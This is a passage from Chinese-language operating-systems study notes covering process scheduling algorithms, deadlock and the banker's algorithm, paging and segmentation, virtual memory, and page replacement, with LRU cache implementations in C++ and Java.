alt="image-20220708102518420"></p><ul><li><p><strong>先来先服务算法（FCFS）</strong></p><p>按照作业到达系统的时间依次分配服务。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220708103037631.png" alt="image-20220708103037631"></p></li><li><p><strong>短作业优先算法（SJF）</strong></p><p>已到达的作业中优先服务所需时间短的作业。</p><p>下列作业中，J1最先到达，服务完毕后，J2、J3、J4均已到达；然后从中挑选出所需服务时间最短的J3先执行，然后是J4、J2。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220708103209648.png" alt="image-20220708103209648"></p></li><li><p><strong>高响应比优先调度算法（HRRN）</strong> </p><p> &#x3D;&#x3D;<strong>响应比</strong> &#x3D; （上一个作业的完成时间 - 本作业的到达时间 + 本作业的所需服务时间）&#x2F; 本作业的所需服务时间&#x3D;&#x3D;</p><p>其中，上一个作业的完成时间 - 本作业的到达时间，就是本作业的等待时间。 </p><p>J1最先到达，先服务J1。之后再计算已到达的J2、J3、J4的响应比，从中选出响应比最高的J3先服务；J3服务完之后，再次计算J2、J4的响应比，从中选出响应比最高的J2先服务；最后服务J4。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220708103802458.png" alt="image-20220708103802458"></p></li><li><p><strong>优先级调度算法</strong></p><p>优先级的数值越大，优先级越高</p><p>执行顺序：P2、P3、P4、P1</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220708104836191.png" alt="image-20220708104836191"></p></li><li><p><strong>时间片轮转算法（RR）</strong></p><p>用于分时系统中的进程调度。按照时间片执行，总是选择就绪队列的队首进程，让其在CPU上运行一个系统预先设置好的时间片，不考虑优先级。一个时间片内没有完成运行的进程，返回到绪队列末尾重新排队，等待下一次调度。</p><p>由于题例中各进程同时到达，则初始就绪队列为P1、P2、P3、P4，每个进程依次执行，每次仅执行一个时间片（题例中q&#x3D;1ms），执行完毕后来到队尾。执行完4个时间片后，P1又来到队首，再次依次执行。8个时间片后，P4执行满2个时间片，结束。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220708105102223.png" alt="image-20220708105102223"></p></li></ul><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>多个进程<strong>因竞争资源</strong>而造成的一种僵局（<strong>互相等待</strong>），<strong>若无外力作用，这些进程都将无法向前推进</strong>。</p><ol><li><p>死锁产生的原因</p><p>系统资源的竞争、进程推进顺序非法</p></li><li><p>死锁产生的必要条件</p><p>产生死锁必须同时满足以下四个条件，只要其中任一条件不成立， 死锁就不会发生。</p><ul><li><p><strong>互斥条件</strong></p><p>进程要求对所分配的资源进行排他性控制，即<u>在一段时间内某资源仅为一个进程所占有</u>。此时若有其他进程请求该资源，则请求进程只能等待。</p></li><li><p><strong>不剥夺条件</strong></p><p>进程所获得的资源在未使用完毕之前，不能被其他进程强行夺走，即只能由获得该资源的进程自己来释放。</p></li><li><p><strong>部分分配条件</strong>（请求和保持条件）</p><p>进程每次申请它所需要的一部分资源，<u>在等待新资源的同时，进程继续占有已分配到的资源</u>。</p></li><li><p><strong>循环等待条件</strong></p><p>存在一种进程资源的循环等待链，链中每个进程己获得的资源同时被链中下一个进程所请求。即存在一个处于等待状态的进程集合{${P_1, P_2, P_3, ……, P_n}$} ,其中$P_i$等待的资源被$P_{i+1}$(i&#x3D;0,1, … n-1)占有，$P_n$等待资源被$P_0$占有。</p></li></ul></li><li><p>死锁的处理策略</p><ol><li><p><strong>预防死锁</strong>：设置某些限制条件，破坏产生死锁的四个必要条件中的一个或几个。</p></li><li><p><strong>避免死锁</strong>：在资源的动态分配过程中，用某种方法防止系统进入不安全状态。<strong>银行家算法</strong>是著名的死锁避免算法。</p></li><li><p><strong>死锁的检测及解除</strong>：无须采取任何限制性措施，允许进程在运行过程中发生死锁，通过系统的检测机制及时地检测出死锁的发生，然后采取某种措施解除死锁。</p></li></ol><p>死锁的检测可利用资源分配图来描述。死锁的解除主要方法如下:</p><p>(1) 资源剥夺法。</p><p>(2) 撤销进程法。</p><p>(3) 进程回退法。</p></li></ol><p><strong>&#x3D;&#x3D;银行家算法&#x3D;&#x3D;</strong></p><p>在进程提出资源申请时，先预判此分配是否会导致系统进入不安全状态。如果会进入不安全状态，就暂时不答应这次请求，让该进程先阻塞等待。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220708110103384.png" alt="image-20220708110103384"></p><p>解答：</p><p>（1）系统拥有A、B、C、D类资源各3、14、12、12个。对于这4类资源，已被五个进程占有的资源量分别为A类2个、B类9个、C类10个、D类12个。因此这4类资源分别还剩A类1个、B类5个、C类2个、D类0个。</p><p>（2）首先列出各个进程的已分配allocated、尚需need，以及剩余可用资源available。然后开始寻找可行的安全序列（不唯一）。</p><p>比如，最开始的available为<code>1 5 2 0</code>，可满足P1、P4的need，任选其一，选择P1。P1被满足后再释放已分配的资源allocated，使得available变为<code>1 5 3 2</code>，这时的available可满足P3、P4的need，继续选择即可。按照这个方法可以得到一条可行的安全序列P1、P4、P2、P3、P5。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220708145951210.png" alt="image-20220708145951210" style="zoom:50%;"><p>（3）先判断所提需求的<code>0 4 2 0</code>是否小于等于P2的need（在其需求范围内），以及同时小于等于Allocated（在可提供资源范围内）。当同时满足这两个条件时，可以更新P2的need和Allocated，即P2的need减少<code>0 4 2 0</code>，P2的Allocated增加<code>0 4 2 0</code>，以及剩余可用资源available减少<code>0 4 2 0</code>。接着，再按照第2问的做法，寻找可行的安全序列。若能找到安全序列，则代表系统能满足P2的请求。</p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>操作系统<strong>对内存的划分和动态分配</strong>，就是内存管理的概念。</p><p>内存管理的功能有:</p><ol><li>内存空间的分配与回收，包括内存的管理和共享。</li><li>地址转换，把逻辑地址转换成相应的物理地址。</li><li>内存空间的扩充，利用虚拟存储技术或自动覆盖技术，从逻辑上扩充内存。</li><li>存储保护，保证各道作业在各自的存储空间内运行，互不干扰。</li></ol><h3 id="逻辑地址空间与物理地址空间"><a href="#逻辑地址空间与物理地址空间" class="headerlink" title="逻辑地址空间与物理地址空间"></a>逻辑地址空间与物理地址空间</h3><p><strong>逻辑地址：</strong></p><p>编译后，每个目标模块都是从0号单元开始编址，称为该目标模块的相对地址(或逻辑地址)。当链接程序将各个模块链接成一个完整的可执行目标程序时，链接程序顺序依次按各个模块的相对地址构成<strong>统一的从0号单元开始编址的逻辑地址空间</strong>。</p><p><strong>物理地址：</strong></p><p>物理地址空间是指内存中物理单元的集合，它是地址转换的最终地址，进程在运行时执行指令和访问数据最后都要通过物理地址来存取主存。<u>当装入程序将可执行代码装入内存时，必须通过地址转换将逻辑地址转换成物理地址</u>，这个过程称为<strong>地址重定位</strong>。</p><h3 id="内存分配管理方式"><a href="#内存分配管理方式" class="headerlink" title="内存分配管理方式"></a>内存分配管理方式</h3><p>内存分配管理方式包括连续分配管理方式与非连续分配管理方式。</p><p><strong>连续分配管理方式</strong>，是指为一个用户程序<u>分配一个连续的内存空间</u>。它主要包括单一连续分配、固定分区分配和动态分区分配。</p><p><strong>非连续分配管理方式</strong>允许一个程序<u>分散地装入到不相邻的内存分区中</u>，根据分区的大小是否固定分为<strong>分页存储管理方式和分段存储管理方式</strong>。分页存储管理方式中，又根据运行作业时是否要把作业的所有页面都装入内存才能运行分为<strong>基本分页存储管理方式和请求分页存储管理方式</strong>。</p><ul><li>固定分区：</li></ul><p>将主内存分为固定大小的分区, 这些大小可以相等或不相等。每当我们必须分配进程内存时, 就会找到一个足够大的空闲分区来容纳该进程。然后将内存分配给进程。如果没有可用空间, 则进程在队列中等待分配内存。会产生<strong>内部碎片</strong>（<u>处于已分配区域内部或页面内部</u>的存储块，占有这些区域或页面的进程并不使用这个存储块。直到进程释放它，或进程结束时，系统才有可能利用这个存储块）。</p><ul><li>动态分区</li></ul><p>主内存不划分为多个分区, 并且<u>为进程分配了一块足够大的可用内存</u>。剩余的空间被视为可以由其他进程进一步使用的自由空间。会产生<strong>外部碎片</strong>（还没有被分配出去，不属于任何进程，但由于太小了无法分配给申请内存空间的新进程的内存空闲区域），外部碎片是<u>处于任何已分配区域或页面外部</u>的空闲存储块。这些存储块的总和可以满足当前申请的长度要求，但是由于它们的地址不连续或其他原因，使得系统无法满足当前申请。</p><h4 id="基本分页存储管理方式"><a href="#基本分页存储管理方式" class="headerlink" title="基本分页存储管理方式"></a>基本分页存储管理方式</h4><p>基本分页存储管理方式中，分区（块）的大小是固定的；运行作业时要把作业的所有页面都装入内存才能运行；</p><ul><li><p>概念</p><p>由于固定分区和动态分区都会产生内存的碎片，为了提高内存利用率，引入分页的思想：<strong>把主存空间划分为大小相等且固定的块，块相对较小，作为主存的基本单位。每个进程也以块为单位进行划分，进程在执行时，以块为单位逐个申请主存中的块空间。</strong></p></li><li><p>特点：仅产生很小的页内碎片</p><p>分页的方法从形式上看，像分区相等的固定分区技术，分页管理不会产生外部碎片。但它又有本质的不同点：</p><p>块的大小相对分区要小很多，而且进程也按照块进行划分，进程运行时按块申请主存可用空间并执行。这样，<strong>进程只会在为最后一个不完整的块申请一个主存块空间时，才产生主存碎片，所以尽管会产生内部碎片，但是这种碎片相对于进程来说也是很小的，每个进程平均只产生半个块大小的内部碎片</strong>(也称<strong>页内碎片</strong>)。</p></li><li><p>分页存储的几个基本概念</p><p>① 页面和页面大小</p><p><strong>进程中的块称为页</strong>(Page)（逻辑上），<strong>内存中的块称为页框</strong>(Page Frame,或页帧)。外存也以同样的单位进行划分，称为块(Block)（物理上）。进程在执行时需要申请主存空间，就是要<strong>为每个页面分配主存中的可用页框，这就产生了页和页框的一一对应</strong>。</p><p>为方便地址转换，<strong>页面大小应是2的整数幂</strong>。同时页面大小应该适中，如果页面太小，会使进程的页面数过多，这样页表就过长，占用大量内存，而且也会增加硬件地址转换的开销，降低页面换入换出的效率；页面过大又会使页面内碎片增大，降低内存的利用率。</p><p>②地址结构</p><p>分页存储管理的<strong>逻辑地址结构</strong>如下图所示：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220708155843373.png" alt="image-20220708155843373"></p><p>地址结构包含两部分：前一部分为页号P，后一部分为页内偏移量M。地址长度为32位，其中0<del>11位为页内地址，即每页大小为$2^{12}$B，即4KB; 12</del>31 位为页号，地址空间最多允许有$2^{20}$页。</p><p>③页表</p><p>为了便于在内存中找到进程的每个页面所对应的物理块，系统为每个进程建立一张页表，<strong>记录页面在内存中对应的物理块号</strong>，页表一般存放在内存中。 在配置了页表后，进程执行时，通过查找该表，即可找到每页在内存中的物理块号。可见，页表的作用是<strong>实现从页号到物理块号的地址映射</strong>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220708160731815.png" alt="image-20220708160731815"></p></li></ul><p>&#x3D;&#x3D;注意&#x3D;&#x3D;：<strong>页号是系统自动生成的，本身地址是线性连续的，当要访问特定地址时，只需要提供地址即可。系统会自动将地址划分为页号和页内位移，而页号对于程序员来说是没有实际意义的，因此分页地址空间是一维的。</strong></p><h4 id="基本分段存储管理方式"><a href="#基本分段存储管理方式" class="headerlink" title="基本分段存储管理方式"></a>基本分段存储管理方式</h4><p>基本分段存储管理方式中，段的大小是不固定的；运行作业时要把作业的所有页面都装入内存才能运行；</p><p>段式管理方式按照用户进程中的自然段划分逻辑空间。例如，用户进程由主程序、两个子程序、栈和一段数据组成，于是可以把这个用户进程划分为5个段，每段从0开始编址，并<strong>分配一段连续的地址空间（段内要求连续，段间不要求连续，因此整个作业的地址空间是二维的，段名+段内地址)。</strong> </p><p>其逻辑地址由段号s与段内偏移量W两部分组成。在下图中，段号为16位，段内偏移量为16位，则一个作业最多可有2^16&#x3D; 65536个段，最大段长为64KB。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220708160942731.png" alt="image-20220708160942731"></p><p>在页式系统中，逻辑地址的页号和页内偏移量对用户是透明的，但<u>在段式系统中，段号和段内偏移量必须由用户显示提供</u>，在高级程序设计语言中，这个工作由编译程序完成。</p><p><strong>&#x3D;&#x3D;分页和分段存储管理方式的区别：&#x3D;&#x3D;</strong></p><ul><li>分页存储管理中块是信息的物理单位，能够提高内存利用率；而分段存储管理中段是逻辑单位，分段是为了反映程序的逻辑结构，方便满足用户程序模块化的需要；</li><li>页的大小是固定的，由系统决定；而段的大小不固定，取决于用户编写的程序；</li><li>分页的地址空间是一维的，因为页是连续的；分段的地址空间是二维的，需要段名+段内地址。</li></ul><h4 id="段页式管理方式"><a href="#段页式管理方式" class="headerlink" title="段页式管理方式"></a>段页式管理方式</h4><p>页式存储管理能有效地提高内存利用率，而分段存储管理能反映程序的逻辑结构并有利于段的共享。如果将这两种存储管理方法结合起来，就形成了段页式存储管理方式。</p><p>在段页式系统中，作业的地址空间<strong>首先被分成若干<u>逻辑段</u>，每段都有自己的段号</strong>，然后<strong>再将每一段分成若干大小固定的页</strong>。对内存空间的管理仍然和分页存储管理一样，将其分成若干和页面大小相同的存储块，对内存的分配以存储块为单位。<u>（逻辑上分段，物理上分页）</u></p><p>在段页式系统中，<strong>作业的逻辑地址分为三部分：段号、页号和页内偏移量</strong>。为了实现地址变换，系统为<strong>每个进程建立一张段表，而每个分段有一张页表</strong>。段表表项中至少包括段号、页表长度和页表起始地址，页表表项中至少包括页号和块号。此外，系统中还应有一个段表寄存器，指出作业的段表起始地址和段表长度。<strong>在进行地址变换时，首先通过段表查到页表起始地址，然后通过页表找到页帧号，最后形成物理地址。</strong></p><h3 id="虚拟内存管理"><a href="#虚拟内存管理" class="headerlink" title="虚拟内存管理"></a>虚拟内存管理</h3><ul><li><p>针对的问题</p><p>前面的分页、分段、段页式存储管理都具有以下两个共同特征（缺点）：运行作业时要把作业的所有页面都装入内存才能运行；驻留性：作业被装入内存后，就一直驻留在内存中，其任何部分都不会被换出，直至作业运行结束。</p><p>由以上分析可知，<u>许多在程序运行中不用或暂时不用的程序(数据)占据了大量的内存空间，而一些需要运行的作业又无法装入运行</u>，显然浪费了宝贵的内存资源。</p></li><li><p>依据的原理</p><p>&#x3D;&#x3D;<strong>局部性原理</strong>&#x3D;&#x3D;是指CPU访问存储器时，无论是存取指令还是存取数据，所访问的存储单元都趋于聚集在一个较小的连续区域中。</p><p>时间局部性：在一个具有良好的时间局部性的程序中，被访问过一次的存储器位置很可能在不远的将来会被再次访问。</p><p>空间局部性：在一个具有良好空间局部性的程序中，如果一个存储器位置被访问了一次，那么程序很可能在不远的将来访问附近的一个存储器位置。</p></li></ul><h4 id="虚拟存储器的定义和特征"><a href="#虚拟存储器的定义和特征" class="headerlink" title="虚拟存储器的定义和特征"></a>虚拟存储器的定义和特征</h4><p>基于局部性原理，在程序装入时，可以<strong>将程序的一部分装入内存</strong>，而将其余部分留在外存，就可以<strong>启动程序执行</strong>。在程序执行过程中，当<strong>所访问的信息不在内存时，由操作系统将所需要的部分调入内存，然后继续执行程序</strong>。另一方面， 操作系统将内存中暂时不使用的内容换出到外存上，从而腾出空间存放将要调入内存的信息。这样，系统好像为用户提供了一个比实际内存大得多的存储器，称为<u><strong>虚拟存储器</strong></u>。</p><p>之所以将其称为虚拟存储器，是因为这种存储器实际上并不存在，只是由于系统提供了部分装入、请求调入和置换功能后（对用户完全透明），给用户的感觉是好像存在一个比实际物理内存大得多的存储器。</p><p>虚拟内存的实现有以下三种方式:</p><p>1)请求分页存储管理</p><p>2)请求分段存储管理</p><ol start="3"><li>请求段页式存储管理</li></ol><p>不管哪种方式，都需要有一定的硬件支持。一般需要的支持有以下几个方面: .</p><ol><li>一定容量的内存和外存。</li><li>页表机制(或段表机制)，作为主要的数据结构。</li><li>中断机构，当用户程序要访问的部分尚未调入内存，则产生中断。</li><li>地址变换机构，逻辑地址到物理地址的变换。</li></ol><p><strong>段页式虚拟存储器</strong></p><p>基本思想是<strong>对用户原来编写程序的虚拟存储空间采用分段的方法管理</strong>，而<strong>对主存储器的物理空间采用分页的方法管理</strong>。<br>段页式虚拟存储器一方面具有段式虚拟存储器的主要优点。例如，用户程序可以模块化编写，程序段的共享和信息的保护都比较方便，程序可以在执行时再动态链接等。另一方面也具有页式虚拟存储器的主要优点。例如：主存储器的利用率比较高，对辅助存储器的管理比较容易等。</p><h4 id="请求分页管理方式"><a href="#请求分页管理方式" class="headerlink" title="请求分页管理方式"></a>请求分页管理方式</h4><p>运行作业时不需要把作业的所有页面都装入内存才能运行，需要哪一页就请求哪一页。</p><p>请求分页系统建立在基本分页系统基础之上，为了支持虚拟存储器功能而增加了<strong>请求调页功能和页面置换功能</strong>。请求分页是目前最常用的一种实现虚拟存储器的方法。</p><p>在请求分页系统中，只要求将当前需要的一部分页面装入内存，便可以启动作业运行。在作业执行过程中，当所要访问的页面不在内存时，再通过调页功能将其调入，同时还可以通过置换功能将暂时不用的页面换出到外存上，以便腾出内存空间。</p><p>为了实现请求分页，系统必须提供一定的硬件支持。 除了需要一定容量的内存及外存的计算机系统，还需要有<strong>页表</strong>机制、<strong>缺页中断</strong>机构和<strong>地址变换</strong>机构。</p><p>常见的置换算法有以下三种：最佳置换算法、先进先出(FIFO)页面置换算法、最近最久未使用(LRU)置换算法。</p><ul><li><p><em><strong>最佳置换算法(OPT)</strong></em></p><p>最佳(Optimal, OPT)置换算法所选择的<strong>被淘汰页面将是以后永不使用的，或者是在最长时间内不再被访问的页面</strong>，这样可以保证获得最低的缺页率。但由于人们目前无法预知进程在内存下的若干页面中哪个是未来最长时间内不再被访问的，因而<strong>该算法无法实现</strong>。最佳置换算法可以用来评价其他算法。</p></li><li><p><em><strong>先进先出（FIFO）页面置换算法</strong></em></p><p><strong>优先淘汰最早进入内存的页面</strong>，亦即在内存中驻留时间最久的页面。该算法实现简单，只需把调入内存的页面根据先后次序链接成队列，设置一个指针总指向最早的页面。但该算法与进程实际运行时的规律不适应，因为在进程中，有的页面经常被访问。</p><p>FIFO算法还会产生当所分配的物理块数增大而页故障数不减反增的异常现象，这是由Belady于1969年发现，故称为<strong>Belady异常</strong>，如图2-3所示。FIFO算法可能出现Belady异常，而LRU和OPT算法永远不会出现Belady异常。</p></li><li><p><em><strong>最近最久未使用（LRU）置换算法</strong></em></p><p>选择最近最长时间未访问过的页面予以淘汰，它认为过去一-段时间内未访问过的页面， 在最近的将来可能也不会被访问。该算法为每个页面设置一个访问字段，来记录页面自上次被访问以来所经历的时间，淘汰页面时选择现有页面中值最大的予以淘汰。</p><p>LRU性能较好，但需要寄存器和栈的硬件支持。LRU是堆栈类的算法。理论上可以证明，堆栈类算法不可能出现Belady异常。FIFO 算法基于队列实现，不是堆栈类算法。</p><p>&#x3D;&#x3D;手写LRU&#x3D;&#x3D;</p><p>C++实现：<a href="https://blog.csdn.net/Appleeatingboy/article/details/118306037">https://blog.csdn.net/Appleeatingboy/article/details/118306037</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*使用双向链表 + 哈希表 实现*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">            <span class="type">int</span> key;</span><br><span class="line">            <span class="type">int</span> val;</span><br><span class="line">            Node* pre;</span><br><span class="line">            Node* next;</span><br><span class="line">            <span class="built_in">Node</span>()&#123;&#125;</span><br><span class="line">            <span class="built_in">Node</span>(<span class="type">int</span> mkey, <span class="type">int</span> mvalue):<span class="built_in">key</span>(mkey),<span class="built_in">val</span>(mvalue),<span class="built_in">pre</span>(<span class="literal">NULL</span>),<span class="built_in">next</span>(<span class="literal">NULL</span>)&#123; &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="built_in">LRUCache</span>(<span class="type">int</span> capacity) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;size = capacity;</span><br><span class="line">        <span class="comment">//头尾保护节点</span></span><br><span class="line">        head = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        <span class="comment">//初始化双链表关系</span></span><br><span class="line">        head-&gt;next = tail;</span><br><span class="line">        tail-&gt;pre = head;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function">Node* <span class="title">delete_currentnode</span><span class="params">(Node* current)</span></span>&#123;</span><br><span class="line">        current-&gt;pre-&gt;next = current-&gt;next;</span><br><span class="line">        current-&gt;next-&gt;pre = current-&gt;pre;</span><br><span class="line">        <span class="keyword">return</span> current;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//移动到最前面</span></span><br><span class="line">    <span class="comment">//相当于在链表中一个insert操作，在head 和 head的next之间插入一个节点</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">move_to_head</span><span class="params">(Node* current)</span></span>&#123;</span><br><span class="line">        Node* next = head-&gt;next;</span><br><span class="line">        head-&gt;next = current;</span><br><span class="line">        current-&gt;pre = head;</span><br><span class="line">        next-&gt;pre = current;</span><br><span class="line">        current-&gt;next = next;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">make_recently</span><span class="params">(Node* current)</span></span>&#123;</span><br><span class="line">        Node* temp = <span class="built_in">delete_currentnode</span>(current);</span><br><span class="line">        <span class="built_in">move_to_head</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">get</span><span class="params">(<span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">//get 到key的value,要进行将key的对值从存储结构中删除，然后重新排列前后的数据</span></span><br><span class="line">        <span class="keyword">if</span>(map.<span class="built_in">find</span>(key)!= map.<span class="built_in">end</span>())&#123;</span><br><span class="line">            Node* temp = map[key];</span><br><span class="line">            <span class="built_in">make_recently</span>(temp);</span><br><span class="line">            ret = temp-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(map.<span class="built_in">find</span>(key) != map.<span class="built_in">end</span>())&#123;</span><br><span class="line">            <span class="comment">//关键字存在，修改key,对应的值</span></span><br><span class="line">            Node* temp = map[key];</span><br><span class="line">            temp-&gt;val= value;</span><br><span class="line">            <span class="comment">//将key变为最近使用</span></span><br><span class="line">            <span class="built_in">make_recently</span>(temp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//关键字不存在，插入,(key,value)</span></span><br><span class="line">            Node* cur = <span class="keyword">new</span> <span class="built_in">Node</span>(key,value);</span><br><span class="line">            <span class="keyword">if</span>( map.<span class="built_in">size</span>()==size )&#123;</span><br><span class="line">                <span class="comment">//链表尾部就是最久未使用的key</span></span><br><span class="line">                Node* temp = <span class="built_in">delete_currentnode</span>(tail-&gt;pre);</span><br><span class="line">                map.<span class="built_in">erase</span>(temp-&gt;key);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">move_to_head</span>(cur);</span><br><span class="line">            map[key] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//类内共享容量值</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, Node*&gt; map;</span><br><span class="line">    Node* head;</span><br><span class="line">    Node* tail;</span><br></pre></td></tr></table></figure><p>用 Java 的内置类型 <code>LinkedHashMap</code> 来实现 LRU 算法：<a href="https://blog.csdn.net/lwb102063/article/details/114085191">https://blog.csdn.net/lwb102063/article/details/114085191</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line">    <span class="type">int</span> cap;</span><br><span class="line">    LinkedHashMap&lt;Integer, Integer&gt; cache = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LRUCache</span><span class="params">(<span class="type">int</span> capacity)</span> &#123; </span><br><span class="line">        <span class="built_in">this</span>.cap = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!cache.containsKey(key)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将 key 变为最近使用</span></span><br><span class="line">        makeRecently(key);</span><br><span class="line">        <span class="keyword">return</span> cache.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache.containsKey(key)) &#123;</span><br><span class="line">            <span class="comment">// 修改 key 的值</span></span><br><span class="line">            cache.put(key, val);</span><br><span class="line">            <span class="comment">// 将 key 变为最近使用</span></span><br><span class="line">            makeRecently(key);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (cache.size() &gt;= <span class="built_in">this</span>.cap) &#123;</span><br><span class="line">            <span class="comment">// 链表头部就是最久未使用的 key</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">oldestKey</span> <span class="operator">=</span> cache.keySet().iterator().next();</span><br><span class="line">            cache.remove(oldestKey);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将新的 key 添加链表尾部</span></span><br><span class="line">        cache.put(key, val);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">makeRecently</span><span class="params">(<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> cache.get(key);</span><br><span class="line">        <span class="comment">// 删除 key，重新插入到队尾</span></span><br><span class="line">        cache.remove(key);</span><br><span class="line">        cache.put(key, val);</span><br><span class="line">    &#125;</span><br><span 